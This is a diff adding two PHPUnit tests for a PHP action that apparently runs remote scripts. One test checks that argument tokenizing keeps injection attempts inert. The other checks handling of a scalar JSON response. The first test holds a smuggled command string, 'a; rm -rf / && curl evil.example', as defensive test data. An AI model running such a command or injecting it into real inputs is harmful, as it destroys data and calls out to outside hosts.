@@ -170,4 +170,36 @@ class RunScriptActionTest extends TestCase
 
         $this->assertStringNotContainsString('supersecretvalue123', $summary);
     }
+
+    public function test_shell_metacharacters_stay_inside_one_quoted_token(): void
+    {
+        // Argv safety (§11.1): the tokenizer must NOT split on whitespace inside a
+        // quoted value, so an injection-style arg stays a SINGLE inert argv
+        // element (it is sent as a discrete arg, never shell-concatenated).
+        $params = $this->action->validateParams([
+            'tactical_script_id' => 201,
+            'args' => '-Cmd "a; rm -rf / && curl evil.example" -Flag',
+            'timeout' => 60,
+        ]);
+
+        $this->assertSame(['-Cmd', 'a; rm -rf / && curl evil.example', '-Flag'], $params['args']);
+    }
+
+    public function test_execute_normalizes_a_scalar_runscript_response(): void
+    {
+        // Regression (mirrors the live reboot fix): if runscript returns a JSON
+        // scalar instead of an object, runScript() (typed `mixed`) returns a
+        // non-array and execute() must normalize it to an ok result — NOT raise
+        // an uncaught TypeError that bypasses the bus's exception catch.
+        $stack = HandlerStack::create(new MockHandler([
+            new Response(200, [], json_encode('ok')), // body is the JSON string "ok"
+        ]));
+        $client = new TacticalClient(new GuzzleClient(['base_uri' => 'https://t.example.com/', 'handler' => $stack]));
+
+        $params = $this->action->validateParams(['tactical_script_id' => 201, 'timeout' => 60]);
+        $result = $this->action->execute($client, 'AGENT-1', $params);
+
+        $this->assertTrue($result->isOk());
+        $this->assertSame('ok', $result->stdout);
+    }
 }
